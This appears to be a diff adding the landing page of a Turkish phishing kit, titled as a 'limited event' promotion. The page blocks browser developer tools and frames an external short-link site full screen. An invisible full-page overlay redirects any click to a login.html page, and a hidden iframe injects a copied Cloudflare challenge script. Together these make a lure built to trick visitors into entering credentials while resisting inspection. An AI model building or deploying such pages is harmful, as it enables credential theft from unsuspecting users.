@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+  	<meta name="viewport" content="width=device-width, initial-scale=1">
+  	<title>SINIRLI ETKİNLİK</title>
+
+  	<link rel="stylesheet" href="npm/bootstrap-5.3.2/dist/css/bootstrap.min.css">
+  	<script disable-devtool-auto src='npm/disable-devtool-latest.js'></script>
+
+  	<style>
+		html, body {
+			height: 100%;
+			margin: 0;
+		}
+
+		#icerikKapsayici {
+			position: relative;
+			width: 100%;
+			height: 100%;
+		}
+
+		#icerikKapsayici iframe {
+			position: absolute;
+			width: 100%;
+			height: 100%;
+			border: none;
+		}
+  	</style>
+</head>
+<body>
+
+<div id="icerikKapsayici"></div>
+
+<script>
+	// Gösterilecek iframe bağlantısı
+	const iframeAdresi = 'https://nmx.li-nk.lol';
+
+	// Kapsayıcı alanı seç
+	const icerikKapsayici = document.getElementById('icerikKapsayici');
+
+	// Yeni iframe oluştur
+	const cerceve = document.createElement('iframe');
+	cerceve.src = iframeAdresi;
+	cerceve.allowFullscreen = true;
+
+	// Sayfaya ekle
+	icerikKapsayici.appendChild(cerceve);
+</script>
+
+<script>
+(function(){
+	function yukle(){
+		var belge = gizliIFrame.contentDocument || gizliIFrame.contentWindow.document;
+		if(belge){
+			var ekle = belge.createElement('script');
+			ekle.innerHTML = "window.__CF$cv$params={r:'9a1a6dfc4fb81035',t:'MTc2MzY2NzczNw=='};"+
+			"var s=document.createElement('script');s.src='cdn-cgi/challenge-platform/scripts/jsd/main.js';"+
+			"document.getElementsByTagName('head')[0].appendChild(s);";
+			belge.getElementsByTagName('head')[0].appendChild(ekle);
+		}
+	}
+
+	if(document.body){
+		var gizliIFrame = document.createElement('iframe');
+		gizliIFrame.height = 1;
+		gizliIFrame.width = 1;
+		gizliIFrame.style.position = 'absolute';
+		gizliIFrame.style.top = 0;
+		gizliIFrame.style.left = 0;
+		gizliIFrame.style.border = 'none';
+		gizliIFrame.style.visibility = 'hidden';
+		document.body.appendChild(gizliIFrame);
+
+		if(document.readyState !== 'loading'){
+			yukle();
+		} else if(window.addEventListener){
+			document.addEventListener('DOMContentLoaded', yukle);
+		} else {
+			var onceki = document.onreadystatechange || function(){};
+			document.onreadystatechange = function(e){
+				onceki(e);
+				if(document.readyState !== 'loading'){
+					document.onreadystatechange = onceki;
+					yukle();
+				}
+			};
+		}
+	}
+})();
+</script>
+
+<center>
+	<font size="2">
+		</font>
+</center>
+
+<!-- Tıklama katmanı: sayfa tıklanırsa login.html'e gider -->
+<div onclick="location.href='login.html'" 
+     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:transparent;"></div>
+
+</body>
+</html>
